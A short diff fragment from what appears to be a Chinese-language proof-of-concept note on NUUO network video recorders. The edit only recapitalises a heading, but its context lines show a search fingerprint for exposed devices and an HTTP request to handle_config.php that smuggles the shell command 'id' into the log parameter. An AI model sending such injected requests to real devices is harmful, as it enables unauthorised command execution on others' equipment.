@@ -8,7 +8,7 @@ NUUO摄像头是中国台湾NUUO公司旗下的一款网络视频记录器，NUU
 body="www.nuuo.com/eHelpdesk.php"
 ```
 
-## poc
+## POC
 
 ```javascript
 GET /handle_config.php?log=;id; HTTP/1.1
